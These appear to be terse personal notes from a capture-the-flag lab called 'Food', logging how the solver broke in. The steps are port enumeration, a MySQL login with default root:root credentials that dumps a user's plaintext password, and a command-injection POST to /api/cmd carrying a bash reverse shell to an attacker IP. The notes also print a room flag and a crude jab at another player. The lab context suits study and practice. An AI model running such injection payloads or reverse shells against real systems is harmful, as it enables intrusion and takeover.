Food:
Basic enum only reveals 22, 3306, and 9999
22 is used with gathered creds
ssh pasta@food.thm
ssh food@food.thm
ssh ramen@food.thm
#bread is through webshell, by far the most complicated yet i found it first ofc *eye roll*
note: MatteoZSec is a bish who uses autopwn scripts on this machine, then trolls your shells.
3306 is interesting
Creds are root:root apparently
mysql -h 10.10.149.17 -u root -p
root
use users;
show tables;
select * from User;
gives user:pass of ramen
ramen:noodlesRTheBest
gives flag
thm{2f30841ff8d9646845295135adda8332}
9999 is competition infrastructure

Request is being made on the client side, change with burp or curl?
Request is to /api/cmd
curl 10.10.243.220:15065/api/cmd -X POST -d "ls -lah"
curl 10.10.243.220:15065/api/cmd -X POST -d 'sh -i >& /dev/tcp/10.6.97.245/4444 0>&1’
python3 -c 'import pty; pty.spawn("/bin/bash")'
I am an idiot I sat here for 30 min wondering why no rev shells were working as I entered RHOST in LHOST.
Found cool autorevshell site: https://www.revshells.com/
Got shell for user (bread)
